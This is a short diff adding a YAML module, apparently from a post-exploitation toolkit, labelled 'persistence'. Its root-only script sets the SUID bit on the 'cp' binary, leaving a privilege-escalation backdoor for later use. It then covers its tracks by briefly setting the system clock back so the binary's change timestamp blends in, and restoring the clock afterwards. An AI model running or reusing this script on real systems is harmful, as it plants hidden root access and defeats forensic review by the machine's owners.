@@ -1,0 +1,14 @@
+name: "suid maker"
+description: "Adds suid bit to cp binary"
+category: persistence
+need_root: true
+variables: []
+priority: 1000
+tip: "Binary 'cp' has suid bit now"
+script: |
+  NOW=$(date +@%s)
+  date -s "$(stat -c '@%Z' /etc/hostname)"
+  chmod u+s $(which cp)
+  touch $(which cp)
+  date -s "$NOW"
+  unset NOW
